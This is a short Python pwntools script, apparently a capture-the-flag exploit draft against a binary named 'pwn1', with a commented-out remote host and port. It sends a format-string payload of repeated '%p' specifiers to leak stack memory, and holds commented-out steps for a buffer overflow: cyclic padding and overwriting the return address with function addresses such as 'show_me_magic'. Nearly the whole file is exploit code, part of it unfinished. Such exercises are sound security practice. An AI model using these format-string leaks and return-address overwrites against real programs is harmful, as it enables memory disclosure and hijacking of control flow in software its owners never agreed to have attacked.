from pwn import *

p = process("./pwn1")
# p = remote("140.115.59.7", 11002)

print(p.recv())
raw_input("attach gdb")
leakString = "|".join(["%p" for _ in xrange(0, 32)])
p.sendline(leakString)

leaks = p.recvuntil("enter your magic spell:").split(("|"))
print(leaks)

# padding = cyclic(0xff+0xf)
# padding = "A" * cyclic_find("aabnaabo")

# RET = p64(0x4004ee)

# RIP = p64(0x4242424243434343)

# show_me_magic
# RIP = p64(0x400627)

# frame_dummy
# RIP = p64(0x400620)

# p.sendline("hi\x00")
p.interactive()